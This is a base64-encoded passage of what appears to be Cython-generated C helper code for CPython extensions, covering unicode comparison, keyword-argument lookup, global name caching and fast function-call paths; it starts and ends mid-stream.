AgICAgICB9CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICAgICAgewogICAgICAgICAgICBQeV9oYXNoX3QgaGFzaDEsIGhhc2gyOwogICAgICAgICAgICBoYXNoMSA9ICgoUHlBU0NJSU9iamVjdCopczEpLT5oYXNoOwogICAgICAgICAgICBoYXNoMiA9ICgoUHlBU0NJSU9iamVjdCopczIpLT5oYXNoOwogICAgICAgICAgICBpZiAoaGFzaDEgIT0gaGFzaDIgJiYgaGFzaDEgIT0gLTEgJiYgaGFzaDIgIT0gLTEpIHsKICAgICAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgICAgICBraW5kID0gX19QeXhfUHlVbmljb2RlX0tJTkQoczEpOwogICAgICAgIGlmIChraW5kICE9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMyKSkgewogICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgICAgICB9CiAgICAgICAgZGF0YTEgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMSk7CiAgICAgICAgZGF0YTIgPSBfX1B5eF9QeVVuaWNvZGVfREFUQShzMik7CiAgICAgICAgaWYgKF9fUHl4X1B5VW5pY29kZV9SRUFEKGtpbmQsIGRhdGExLCAwKSAhPSBfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMiwgMCkpIHsKICAgICAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICAgICAgfSBlbHNlIGlmIChsZW5ndGggPT0gMSkgewogICAgICAgICAgICBnb3RvIHJldHVybl9lcTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gbWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkobGVuZ3RoICoga2luZCkpOwogICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSkgPyAocmVzdWx0ID09IDApIDogKHJlc3VsdCAhPSAwKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKChzMSA9PSBQeV9Ob25lKSAmIHMyX2lzX3VuaWNvZGUpIHsKICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgIH0gZWxzZSBpZiAoKHMyID09IFB5X05vbmUpICYgczFfaXNfdW5pY29kZSkgewogICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgfSBlbHNlIHsKICAgICAgICBpbnQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7CiAgICAgICAgaWYgKCFweV9yZXN1bHQpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTsKICAgICAgICBQeV9ERUNSRUYocHlfcmVzdWx0KTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQpyZXR1cm5fZXE6CiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7CnJldHVybl9uZToKICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTsKI2VuZGlmCn0KCgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9HZXRLd1ZhbHVlX0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzLCBQeU9iamVjdCAqcykKewogICAgUHlfc3NpemVfdCBpLCBuID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKTsKICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIGlmICh1bmxpa2VseShuID09IC0xKSkgcmV0dXJuIE5VTEw7CiAgICAjZW5kaWYKICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHMgPT0gbmFtZWkpIHJldHVybiBrd3ZhbHVlc1tpXTsKICAgIH0KICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVpID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd25hbWVzLCBpKTsKICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIW5hbWVpKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaW50IGVxID0gX19QeXhfUHlVbmljb2RlX0VxdWFscyhzLCBuYW1laSwgUHlfRVEpOwogICAgICAgIGlmICh1bmxpa2VseShlcSAhPSAwKSkgewogICAgICAgICAgICBpZiAodW5saWtlbHkoZXEgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgIHJldHVybiBrd3ZhbHVlc1tpXTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gTlVMTDsKfQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpDWVRIT05fVU5VU0VEIHN0YXRpYyBQeU9iamVjdCAqX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKFB5T2JqZWN0ICprd25hbWVzLCBQeU9iamVjdCAqY29uc3QgKmt3dmFsdWVzKSB7CiAgICBQeV9zc2l6ZV90IGksIG5rd2FyZ3M7CiAgICBQeU9iamVjdCAqZGljdDsKI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgbmt3YXJncyA9IFB5VHVwbGVfU2l6ZShrd25hbWVzKTsKICAgIGlmICh1bmxpa2VseShua3dhcmdzIDwgMCkpIHJldHVybiBOVUxMOwojZWxzZQogICAgbmt3YXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoa3duYW1lcyk7CiNlbmRpZgogICAgZGljdCA9IFB5RGljdF9OZXcoKTsKICAgIGlmICh1bmxpa2VseSghZGljdCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBmb3IgKGk9MDsgaTxua3dhcmdzOyBpKyspIHsKI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR2V0SXRlbShrd25hbWVzLCBpKTsKICAgICAgICBpZiAoIWtleSkgZ290byBiYWQ7CiNlbHNlCiAgICAgICAgUHlPYmplY3QgKmtleSA9IFB5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShkaWN0LCBrZXksIGt3dmFsdWVzW2ldKSA8IDApKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIHJldHVybiBkaWN0OwpiYWQ6CiAgICBQeV9ERUNSRUYoZGljdCk7CiAgICByZXR1cm4gTlVMTDsKfQojZW5kaWYKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2luaXRfdW5pY29kZV9pdGVyYXRpb24oCiAgICBQeU9iamVjdCogdXN0cmluZywgUHlfc3NpemVfdCAqbGVuZ3RoLCB2b2lkKiogZGF0YSwgaW50ICpraW5kKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAqa2luZCAgID0gMDsKICAgICpsZW5ndGggPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKHVzdHJpbmcpOwogICAgKmRhdGEgICA9ICh2b2lkKil1c3RyaW5nOwojZWxzZQogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWSh1c3RyaW5nKSA8IDApKSByZXR1cm4gLTE7CiAgICAqa2luZCAgID0gUHlVbmljb2RlX0tJTkQodXN0cmluZyk7CiAgICAqbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgodXN0cmluZyk7CiAgICAqZGF0YSAgID0gUHlVbmljb2RlX0RBVEEodXN0cmluZyk7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfdHBfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0OwogICAgcmV0dXJuIGxpa2VseShkaWN0KSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgOiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHsKICAgIFB5T2JqZWN0ICoqZGljdHB0ciA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IFB5X1RZUEUob2JqKS0+dHBfZGljdG9mZnNldDsKICAgIGlmIChvZmZzZXQpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGRpY3RwdHIgPSAobGlrZWx5KG9mZnNldCA+IDApKSA/IChQeU9iamVjdCAqKikgKChjaGFyICopb2JqICsgb2Zmc2V0KSA6IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbHNlCiAgICAgICAgZGljdHB0ciA9IF9QeU9iamVjdF9HZXREaWN0UHRyKG9iaik7CiNlbmRpZgogICAgfQogICAgcmV0dXJuIChkaWN0cHRyICYmICpkaWN0cHRyKSA/IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oKmRpY3RwdHIpIDogMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfb2JqZWN0X2RpY3RfdmVyc2lvbl9tYXRjaGVzKFB5T2JqZWN0KiBvYmosIFBZX1VJTlQ2NF9UIHRwX2RpY3RfdmVyc2lvbiwgUFlfVUlOVDY0X1Qgb2JqX2RpY3RfdmVyc2lvbikgewogICAgUHlPYmplY3QgKmRpY3QgPSBQeV9UWVBFKG9iaiktPnRwX2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIWRpY3QpIHx8IHVubGlrZWx5KHRwX2RpY3RfdmVyc2lvbiAhPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiBvYmpfZGljdF92ZXJzaW9uID09IF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKG9iaik7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKFB5T2JqZWN0ICpuYW1lLCBQWV9VSU5UNjRfVCAqZGljdF92ZXJzaW9uLCBQeU9iamVjdCAqKmRpY3RfY2FjaGVkX3ZhbHVlKQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpCiNlbmRpZgp7CiAgICBQeU9iamVjdCAqcmVzdWx0OwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tKSkgewogICAgICAgIGlmICghUHlFcnJfT2NjdXJyZWQoKSkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShQeUV4Y19OYW1lRXJyb3IpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0QXR0cihfX3B5eF9tLCBuYW1lKTsKICAgIGlmIChsaWtlbHkocmVzdWx0KSkgewogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgbmFtZSwgJnJlc3VsdCkgPT0gLTEpKSBQeUVycl9DbGVhcigpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxzZQogICAgcmVzdWx0ID0gX1B5RGljdF9HZXRJdGVtX0tub3duSGFzaChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBuYW1lLCAoKFB5QVNDSUlPYmplY3QgKikgbmFtZSktPmhhc2gpOwogICAgX19QWVhfVVBEQVRFX0RJQ1RfQ0FDSEUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgcmVzdWx0LCAqZGljdF9jYWNoZWRfdmFsdWUsICpkaWN0X3ZlcnNpb24pCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpIHsKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBQeUVycl9DbGVhcigpOwojZW5kaWYKICAgIHJldHVybiBfX1B5eF9HZXRCdWlsdGluTmFtZShuYW1lKTsKfQoKCiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZikgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICphdHRyID0gUHlPYmplY3RfR2V0QXR0cihhcmdzWzBdLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseSghYXR0cikpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChhdHRyLCBhcmdzKzEsIG5hcmdzZiAtIDEpOwogICAgUHlfREVDUkVGKGF0dHIpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMICYmICFDWVRIT05fVkVDVE9SQ0FMTApzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KFB5Q29kZU9iamVjdCAqY28sIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZ2xvYmFscykgewogICAgUHlGcmFtZU9iamVjdCAqZjsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICoqZmFzdGxvY2FsczsKICAgIFB5X3NzaXplX3QgaTsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBhc3NlcnQoZ2xvYmFscyAhPSBOVUxMKTsKICAgIAogICAgYXNzZXJ0KHRzdGF0ZSAhPSBOVUxMKTsKICAgIGYgPSBQeUZyYW1lX05ldyh0c3RhdGUsIGNvLCBnbG9iYWxzLCBOVUxMKTsKICAgIGlmIChmID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZhc3Rsb2NhbHMgPSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZik7CiAgICBmb3IgKGkgPSAwOyBpIDwgbmE7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRigqYXJncyk7CiAgICAgICAgZmFzdGxvY2Fsc1tpXSA9ICphcmdzKys7CiAgICB9CiAgICByZXN1bHQgPSBQeUV2YWxfRXZhbEZyYW1lRXgoZiwwKTsKICAgICsrdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7CiAgICBQeV9ERUNSRUYoZik7CiAgICAtLXRzdGF0ZS0+cmVjdXJzaW9uX2RlcHRoOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5Q29kZU9iamVjdCAqY28gPSAoUHlDb2RlT2JqZWN0ICopUHlGdW5jdGlvbl9HRVRfQ09ERShmdW5jKTsKICAgIFB5T2JqZWN0ICpnbG9iYWxzID0gUHlGdW5jdGlvbl9HRVRfR0xPQkFMUyhmdW5jKTsKICAgIFB5T2JqZWN0ICphcmdkZWZzID0gUHlGdW5jdGlvbl9HRVRfREVGQVVMVFMoZnVuYyk7CiAgICBQeU9iamVjdCAqY2xvc3VyZTsKICAgIFB5T2JqZWN0ICprd2RlZnM7CiAgICBQeU9iamVjdCAqa3d0dXBsZSwgKiprOwogICAgUHlPYmplY3QgKipkOwogICAgUHlfc3NpemVfdCBuZDsKICAgIFB5X3NzaXplX3Qgbms7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgYXNzZXJ0KGt3YXJncyA9PSBOVUxMIHx8IFB5RGljdF9DaGVjayhrd2FyZ3MpKTsKICAgIG5rID0ga3dhcmdzID8gUHlEaWN0X1NpemUoa3dhcmdzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGlmICgKICAgICAgICAgICAgY28tPmNvX2t3b25seWFyZ2NvdW50ID09IDAgJiYKICAgICAgICAgICAgbGlrZWx5KGt3YXJncyA9PSBOVUxMIHx8IG5rID09IDApICYmCiAgICAgICAgICAgIGNvLT5jb19mbGFncyA9PSAoQ09fT1BUSU1JWkVEIHwgQ09fTkVXTE9DQUxTIHwgQ09fTk9GUkVFKSkgewogICAgICAgIGlmIChhcmdkZWZzID09IE5VTEwgJiYgY28tPmNvX2FyZ2NvdW50ID09IG5hcmdzKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBuYXJncywgZ2xvYmFscyk7CiAgICAgICAgICAgIGdvdG8gZG9uZTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAobmFyZ3MgPT0gMCAmJiBhcmdkZWZzICE9IE5VTEwKICAgICAgICAgICAgICAgICAmJiBjby0+Y29fYXJnY291bnQgPT0gUHlfU0laRShhcmdkZWZzKSkgewogICAgICAgICAgICAKICAgICAgICAgICAgYXJncyA9ICZQeVR1cGxlX0dFVF9JVEVNKGFyZ2RlZnMsIDApOwogICAgICAgICAgICByZXN1bHQgPV9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBQeV9TSVpFKGFyZ2RlZnMpLCBnbG9iYWxzKTsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgIH0KICAgIGlmIChrd2FyZ3MgIT0gTlVMTCkgewogICAgICAgIFB5X3NzaXplX3QgcG9zLCBpOwogICAgICAgIGt3dHVwbGUgPSBQeVR1cGxlX05ldygyICogbmspOwogICAgICAgIGlmIChrd3R1cGxlID09IE5VTEwpIHsKICAgICAgICAgICAgcmVzdWx0ID0gTlVMTDsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgICAgICBrID0gJlB5VHVwbGVfR0VUX0lURU0oa3d0dXBsZSwgMCk7CiAgICAgICAgcG9zID0gaSA9IDA7CiAgICAgICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3YXJncywgJnBvcywgJmtbaV0sICZrW2krMV0pKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihrW2ldKTsKICAgICAgICAgICAgUHlfSU5DUkVGKGtbaSsxXSk7CiAgICAgICAgICAgIGkgKz0gMjsKICAgICAgICB9CiAgICAgICAgbmsgPSBpIC8gMjsKICAgIH0KICAgIGVsc2UgewogICAgICAgIGt3dHVwbGUgPSBOVUxMOwogICAgICAgIGsgPSBOVUxMOwogICAgfQogICAgY2xvc3VyZSA9IFB5RnVuY3Rpb25fR0VUX0NMT1NVUkUoZnVuYyk7CiAgICBrd2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9LV19ERUZBVUxUUyhmdW5jKTsKICAgIGlmIChhcmdkZWZzICE9IE5VTEwpIHsKICAgICAgICBkID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7CiAgICAgICAgbmQgPSBQeV9TSVpFKGFyZ2RlZnMpOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgZCA9IE5VTEw7CiAgICAgICAgbmQgPSAwOwogICAgfQogICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxDb2RlRXgoKFB5T2JqZWN0KiljbywgZ2xvYmFscywgKFB5T2JqZWN0ICopTlVMTCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MsIChpbnQpbmFyZ3MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrLCAoaW50KW5rLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgKGludCluZCwga3dkZWZzLCBjbG9zdXJlKTsKICAgIFB5X1hERUNSRUYoa3d0dXBsZSk7CmRvbmU6CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgdGVybmFyeWZ1bmMgY2FsbCA9IFB5X1RZUEUoZnVuYyktPnRwX2NhbGw7CiAgICBpZiAodW5saWtlbHkoIWNhbGwpKQogICAgICAgIHJldHVybiBQeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpOwogICAgaWYgKHVubGlrZWx5KFB5X0VudGVyUmVjdXJzaXZlQ2FsbCgiIHdoaWxlIGNhbGxpbmcgYSBQeXRob24gb2JqZWN0IikpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gKCpjYWxsKShmdW5jLCBhcmcsIGt3KTsKICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfU3lzdGVtRXJyb3IsCiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDsKICAgIFB5Q0Z1bmN0aW9uIGNmdW5jOwogICAgY2Z1bmMgPSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpOwogICAgc2VsZiA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihmdW5jKTsKICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IGNmdW5jKHNlbGYsIGFyZyk7CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLAogICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlPYmplY3QgKmFyZ3N0dXBsZTsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSAwOwogICAgc2l6ZV90IGk7CiAgICBhcmdzdHVwbGUgPSBQeVR1cGxlX05ldygoUHlfc3NpemVfdCluYXJncyk7CiAgICBpZiAodW5saWtlbHkoIWFyZ3N0dXBsZSkpIHJldHVybiBOVUxMOwogICAgZm9yIChpID0gMDsgaSA8IG5hcmdzOyBpKyspIHsKICAgICAgICBQeV9JTkNSRUYoYXJnc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYXJnc3R1cGxlLCAoUHlfc3NpemVfdClpLCBhcmdzW2ldKSAhPSAoMCkpIGdvdG8gYmFkOwogICAgfQogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBhcmdzdHVwbGUsIGt3YXJncyk7CiAgYmFkOgogICAgUHlfREVDUkVGKGFyZ3N0dXBsZSk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgX1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkKICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgdmVjdG9yY2FsbGZ1bmMgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKFB5T2JqZWN0ICpjYWxsYWJsZSkgewogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUoY2FsbGFibGUpOwogICAgI2lmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKQogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChjYWxsYWJsZSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY2FsbGFibGUpOwogICAgfQogICAgI2VuZGlmCiAgICBpZiAoIVB5VHlwZV9IYXNGZWF0dXJlKHRwLCBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGFzc2VydChQeUNhbGxhYmxlX0NoZWNrKGNhbGxhYmxlKSk7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IHRwLT50cF92ZWN0b3JjYWxsX29mZnNldDsKICAgIGFzc2VydChvZmZzZXQgPiAwKTsKICAgIHZlY3RvcmNhbGxmdW5jIHB0cjsKICAgIG1lbWNweSgmcHRyLCAoY2hhciAqKSBjYWxsYWJsZSArIG9mZnNldCwgc2l6ZW9mKHB0cikpOwogICAgcmV0dXJuIHB0cjsKfQogI